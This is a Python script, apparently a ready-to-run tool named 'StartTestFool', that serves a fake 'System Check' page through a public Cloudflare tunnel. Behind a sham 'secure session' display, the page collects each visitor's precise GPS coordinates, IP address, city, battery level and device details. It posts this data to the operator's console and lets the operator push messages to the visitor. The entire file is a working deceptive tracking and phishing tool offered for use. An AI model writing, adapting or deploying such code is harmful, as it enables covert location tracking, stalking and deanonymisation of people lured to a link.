 #!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- StartTestFool | Qusoor -*-
import os, sys, time, threading, subprocess, socket, re, shutil, json
from datetime import datetime

os.system("clear")
print("\033[92m")
print("  ____  _             _   _____         _   _____           _")
print(" / ___|| |_ __ _ _ __| |_|_   _|__  ___| |_|  ___|__   ___ | |")
print(" \\___ \\| __/ _` | '__| __| | |/ _ \\/ __| __| |_ / _ \\ / _ \\| |")
print("  ___) | || (_| | |  | |_  | |  __/\\__ \\ |_|  _| (_) | (_) | |")
print(" |____/ \\__\\__,_|_|   \\__| |_|\\___||___/\\__|_|  \\___/ \\___/|_|")
print("\033[0m")
print("       Terminal Web Panel  |  Cloudflare Tunnel  |  Qusoor")
print("=" * 65)

# تثبيت المكتبات
print("\033[93m[*] Installing requirements...\033[0m")
for pkg in ["flask", "flask-cors", "requests", "colorama"]:
    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                    "--break-system-packages", pkg],
                   stderr=subprocess.DEVNULL)

from flask import Flask, request, jsonify, Response, make_response
from flask_cors import CORS
import requests
from colorama import init, Fore, Style
init(autoreset=True)

PORT = 5000
HOME = os.path.expanduser("~")
CF = os.path.join(HOME, ".local", "bin", "cloudflared")

app = Flask(__name__)
# CORS مفتوح تماماً لكل النطاقات
CORS(app, resources={r"/*": {"origins": "*"}},
     supports_credentials=False,
     allow_headers=["Content-Type", "ngrok-skip-browser-warning", "*"],
     methods=["GET", "POST", "OPTIONS"])

VISITORS = {}
NOTIFS = []
LOCK = threading.Lock()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def get_public_ip():
    try: return requests.get("https://api.ipify.org", timeout=5).text
    except: return "N/A"

def get_router_ip():
    try:
        r = subprocess.run(["ip","route"], capture_output=True, text=True)
        for line in r.stdout.split("\n"):
            if line.startswith("default"): return line.split()[2]
    except: pass
    return "N/A"

print(Fore.YELLOW + f"[*] Local IP:  {get_local_ip()}")
print(Fore.YELLOW + f"[*] Public IP: {get_public_ip()}")
print(Fore.YELLOW + f"[*] Router IP: {get_router_ip()}")
print(Fore.CYAN + "=" * 65)

def print_visitor(d):
    print(Fore.GREEN + "┌" + "─" * 60)
    print(Fore.GREEN + f"│ New Visitor @ {datetime.now().strftime('%H:%M:%S')}")
    print(Fore.GREEN + "├" + "─" * 60)
    print(Fore.WHITE + f"│ IP:         {d.get('ip','N/A')}")
    print(Fore.WHITE + f"│ Battery:    {d.get('battery','N/A')}")
    print(Fore.WHITE + f"│ Latitude:   {d.get('latitude','N/A')}")
    print(Fore.WHITE + f"│ Country:    {d.get('country','N/A')}")
    print(Fore.WHITE + f"│ City:       {d.get('city','N/A')}")
    print(Fore.WHITE + f"│ Public ip:  {d.get('public_ip','N/A')}")
    print(Fore.WHITE + f"│ Router Ip:  {d.get('router_ip','N/A')}")
    print(Fore.WHITE + f"│ Timezone:   {d.get('timezone','N/A')}")
    print(Fore.WHITE + f"│ Language:   {d.get('language','N/A')}")
    print(Fore.WHITE + f"│ Platform:   {d.get('platform','N/A')}")
    print(Fore.GREEN + "└" + "─" * 60)

def watcher():
    done = set()
    while True:
        with LOCK:
            new = [v for v in VISITORS if v not in done]
        for vid in new:
            print_visitor(VISITORS[vid])
            try:
                a = input(Fore.CYAN + "Do U want add notifications? [Y/N]: ").strip().lower()
                if a == 'y':
                    t = input(Fore.CYAN + "Notification text: ").strip()
                    if t:
                        with LOCK:
                            NOTIFS.append({"visitor": vid, "text": t})
                        print(Fore.GREEN + f"[+] Added: {t}\n")
            except: pass
            done.add(vid)
        time.sleep(1)

# ---------- صفحة HTML أنيقة (بدون إيموجي) ----------
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Check</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0a0a0a;color:#d4d4d4;font-family:'Consolas','Monaco','Courier New',monospace;
       min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .container{width:100%;max-width:620px;background:#111;border:1px solid #1f1f1f;
             border-radius:4px;padding:40px 36px;box-shadow:0 0 40px rgba(0,0,0,.6)}
  .header{display:flex;align-items:center;gap:10px;padding-bottom:20px;
          border-bottom:1px solid #1f1f1f;margin-bottom:28px}
  .dot{width:10px;height:10px;border-radius:50%;background:#2a2a2a}
  .dot.active{background:#4ade80}
  .title{font-size:13px;letter-spacing:2px;color:#737373;text-transform:uppercase;margin-left:auto}
  .status-line{font-size:13px;color:#525252;margin-bottom:6px;letter-spacing:.5px}
  .progress{margin-top:24px;height:2px;background:#1a1a1a;border-radius:1px;overflow:hidden}
  .progress-bar{height:100%;background:#4ade80;width:0%;transition:width .4s ease}
  .info-block{margin-top:28px;padding-top:20px;border-top:1px solid #1f1f1f}
  .info-row{display:flex;justify-content:space-between;padding:7px 0;font-size:12px;
            border-bottom:1px solid #161616}
  .info-row:last-child{border-bottom:none}
  .info-label{color:#525252;letter-spacing:1px}
  .info-value{color:#a3a3a3;text-align:right;word-break:break-all;max-width:60%}
  .footer{margin-top:28px;padding-top:18px;border-top:1px solid #1f1f1f;font-size:11px;
          color:#3f3f3f;text-align:center;letter-spacing:1px}
  .spinner{display:inline-block;width:10px;height:10px;border:1px solid #2a2a2a;
           border-top-color:#4ade80;border-radius:50%;animation:spin .8s linear infinite;
           vertical-align:middle;margin-right:8px}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="dot active"></div><div class="dot"></div><div class="dot"></div>
    <span class="title">System Check</span>
  </div>
  <div class="status-line">
    <span class="spinner" id="sp"></span>
    <span id="s">Initializing connection</span>
    <span id="dots">...</span>
  </div>
  <div class="progress"><div class="progress-bar" id="pb"></div></div>
  <div class="info-block" id="ib">
    <div class="info-row"><span class="info-label">STATUS</span><span class="info-value" id="vs">Pending</span></div>
    <div class="info-row"><span class="info-label">CONNECTION</span><span class="info-value" id="vc">Establishing</span></div>
  </div>
  <div class="footer">SECURE SESSION &mdash; DO NOT CLOSE THIS WINDOW</div>
</div>
<script>
(async function(){
  const S=document.getElementById('s'),D=document.getElementById('dots'),
        P=document.getElementById('pb'),SP=document.getElementById('sp'),
        VS=document.getElementById('vs'),VC=document.getElementById('vc'),
        IB=document.getElementById('ib');
  let dc=0;
  const di=setInterval(()=>{dc=(dc+1)%4;D.textContent='.'.repeat(dc)},400);
  const set=(t,p)=>{S.textContent=t;if(p!==undefined)P.style.width=p+'%'};

  const d={battery:'N/A',latitude:'N/A',longitude:'N/A',country:'N/A',city:'N/A',
           timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A',
           language:navigator.language||'N/A',
           platform:navigator.platform||'N/A',
           screen:(screen.width+'x'+screen.height)||'N/A',
           cores:navigator.hardwareConcurrency||'N/A',
           memory:navigator.deviceMemory?(navigator.deviceMemory+' GB'):'N/A',
           ua:navigator.userAgent||'N/A',
           referrer:document.referrer||'Direct'};

  set('Reading system parameters',20);
  try{const b=await navigator.getBattery();
      d.battery=Math.round(b.level*100)+'% '+(b.charging?'(Charging)':'(Discharging)')}
  catch(e){d.battery='Unavailable'}

  set('Requesting location permission',40);
  try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:8000,enableHighAccuracy:true}));
      d.latitude=p.coords.latitude.toFixed(6);d.longitude=p.coords.longitude.toFixed(6)}
  catch(e){d.latitude='Denied';d.longitude='Denied'}

  set('Resolving network information',60);
  try{const r=await fetch('https://ipapi.co/json/',{cache:'no-store'});const j=await r.json();
      d.country=(j.country_name||'N/A')+' ('+(j.country_code||'??')+')';
      d.city=j.city||'N/A';d.isp=j.org||'N/A'}
  catch(e){}

  set('Transmitting session data',85);
  let ok=false;
  try{
    const resp=await fetch('/api/collect',{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(d)});
    ok=resp.ok;
  }catch(e){}

  set(ok?'Connection established':'Session complete',100);
  SP.style.display='none';clearInterval(di);D.textContent='';
  VS.textContent=ok?'Verified':'Check complete';
  VC.textContent=ok?'Encrypted':'Session closed';

  const extra=document.createElement('div');
  extra.className='info-block';
  extra.innerHTML=`
    <div class="info-row"><span class="info-label">TIMEZONE</span><span class="info-value">${d.timezone}</span></div>
    <div class="info-row"><span class="info-label">LANGUAGE</span><span class="info-value">${d.language}</span></div>
    <div class="info-row"><span class="info-label">PLATFORM</span><span class="info-value">${d.platform}</span></div>
    <div class="info-row"><span class="info-label">SCREEN</span><span class="info-value">${d.screen}</span></div>
    <div class="info-row"><span class="info-label">BATTERY</span><span class="info-value">${d.battery}</span></div>
    <div class="info-row"><span class="info-label">LOCATION</span><span class="info-value">${d.latitude}, ${d.longitude}</span></div>
    <div class="info-row"><span class="info-label">COUNTRY</span><span class="info-value">${d.country}</span></div>
    <div class="info-row"><span class="info-label">CITY</span><span class="info-value">${d.city}</span></div>
  `;
  IB.appendChild(extra);
})();
</script>
</body>
</html>"""

@app.after_request
def add_cors(resp):
    resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.headers['Access-Control-Allow-Headers'] = '*'
    resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    return resp

@app.route('/')
def index(): return Response(HTML, mimetype='text/html')

@app.route('/api/collect', methods=['POST','OPTIONS'])
def collect():
    if request.method == 'OPTIONS':
        return make_response('', 204)
    try:
        d = request.get_json(force=True) or {}
        d['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        d['public_ip'] = get_public_ip()
        d['router_ip'] = get_router_ip()
        vid = f"v_{int(time.time()*1000)}"
        with LOCK: VISITORS[vid] = d
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"status":"error","msg":str(e)}), 500

@app.route('/api/notifications/<vid>', methods=['GET'])
def get_notifs(vid):
    with LOCK:
        return jsonify([n for n in NOTIFS if n['visitor']==vid or n['visitor']=='ALL'])

def ensure_cf():
    if shutil.which("cloudflared"): return shutil.which("cloudflared")
    if os.path.isfile(CF) and os.access(CF, os.X_OK): return CF
    print(Fore.YELLOW + "[*] Downloading cloudflared...")
    os.makedirs(os.path.dirname(CF), exist_ok=True)
    m = os.uname().machine
    f = "cloudflared-linux-amd64" if m in ("x86_64","amd64") else "cloudflared-linux-arm64"
    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/{f}"
    r = requests.get(url, stream=True, timeout=120)
    with open(CF, "wb") as fp:
        for c in r.iter_content(1024*64): fp.write(c)
    os.chmod(CF, 0o755)
    print(Fore.GREEN + f"[+] Saved: {CF}")
    return CF

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)

def start_tunnel(bin):
    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel...")
    p = subprocess.Popen([bin, "tunnel", "--url", f"http://localhost:{PORT}",
                         "--no-autoupdate", "--protocol", "http2"],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    url = None; t0 = time.time()
    while time.time()-t0 < 60:
        line = p.stdout.readline()
        if not line:
            if p.poll() is not None: break
            continue
        m = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
        if m: url = m.group(0); break
    if url:
        print(Fore.GREEN + Style.BRIGHT + "\n" + "=" * 65)
        print(Fore.GREEN + f"[+] PUBLIC URL: {url}")
        print(Fore.GREEN + "=" * 65)
        print(Fore.YELLOW + "[*] Share this link. Waiting for visitors...\n")
    else:
        print(Fore.RED + "[!] No public URL.")
    return p, url

if __name__ == "__main__":
    bin = ensure_cf()
    if not bin: sys.exit(1)
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(2)
    threading.Thread(target=watcher, daemon=True).start()
    proc, _ = start_tunnel(bin)
    print(Fore.CYAN + "[*] Running. Press Ctrl+C to stop.\n")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopped.")
        proc.terminate()
        sys.exit(0)
